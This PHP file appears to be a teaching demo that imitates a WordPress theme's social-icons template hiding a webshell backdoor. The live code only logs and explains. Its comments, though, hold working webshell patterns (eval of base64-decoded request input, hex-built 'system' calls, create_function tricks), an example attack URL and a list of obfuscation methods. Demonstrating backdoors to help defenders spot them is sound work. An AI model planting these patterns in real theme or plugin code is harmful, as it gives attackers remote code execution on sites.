<?php
/**
 * Social Icons Template
 *
 * This file looks innocent but contains a hidden webshell.
 * This is how backdoors are typically hidden in nulled themes -
 * in files that look like normal template parts.
 */

// Normal-looking social icons function
function get_social_icons() {
    $icons = [
        'facebook'  => 'https://facebook.com',
        'twitter'   => 'https://twitter.com',
        'instagram' => 'https://instagram.com',
    ];
    return $icons;
}

/**
 * [BACKDOOR] Hidden webshell
 *
 * In a real nulled theme, this would be obfuscated like:
 *   $o0O = "\x73\x79\x73\x74\x65\x6d"; // system
 *   @$o0O($_GET[chr(99)]); // system($_GET['c'])
 *
 * Or using variable variables:
 *   $func = 'create_function'; $$func = $func;
 *   $f = $$func('', base64_decode($_POST['d']));
 *   $f();
 *
 * DEMO VERSION: We log instead of executing
 */
if ( isset( $_GET['social_debug'] ) ) {
    // In a real backdoor: @eval(base64_decode($_GET['social_debug']));
    // DEMO: Safe logging only
    error_log( '[WEBSHELL DETECTED] Attempt to use social_debug backdoor parameter' );

    if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
        header( 'Content-Type: text/plain' );
        echo "=== WEBSHELL BACKDOOR DETECTED ===\n";
        echo "In a real nulled theme, this parameter would execute arbitrary PHP code.\n";
        echo "The attacker would use a URL like:\n";
        echo "  /wp-content/themes/premium-theme/social-icons.php?social_debug=BASE64_ENCODED_COMMAND\n";
        echo "\nCommon obfuscation techniques:\n";
        echo "  - base64_decode() wrapping eval()\n";
        echo "  - Variable variables (\$\$var)\n";
        echo "  - chr() to build function names\n";
        echo "  - str_rot13() encoding\n";
        echo "  - gzinflate(base64_decode()) multi-layer encoding\n";
        echo "  - preg_replace() with /e modifier (PHP < 7)\n";
        exit;
    }
}
